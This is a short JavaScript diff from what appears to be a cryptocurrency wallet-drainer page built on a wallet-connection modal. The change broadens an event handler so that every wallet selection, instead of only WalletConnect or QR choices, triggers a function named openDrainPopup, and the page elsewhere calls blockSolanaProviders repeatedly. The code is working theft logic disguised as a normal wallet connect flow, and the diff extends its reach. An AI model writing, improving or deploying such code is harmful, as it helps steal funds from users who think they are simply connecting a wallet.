@@ -149,21 +149,15 @@ setTimeout(blockSolanaProviders, 500);
 setTimeout(blockSolanaProviders, 1500);
 setTimeout(blockSolanaProviders, 3000);
 
-// Track wallet name from AppKit events
+// Track wallet name from AppKit events — intercept ALL wallet selections
 modal.subscribeEvents((event) => {
   const e = event?.data?.event;
   if (e === 'SELECT_WALLET') {
     const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
     if (name) {
       lastClickedWallet = name;
-      const n = name.toLowerCase();
-      if (n.includes('walletconnect') || n.includes('qr') || n.includes('wallet connect')) {
-        openDrainPopup('walletconnect');
-      }
+      openDrainPopup(name);
     }
-  }
-  if (e === 'CONNECT_PRESS' || e === 'SELECT_WALLET_CONNECT') {
-    openDrainPopup('walletconnect');
   }
 });
 
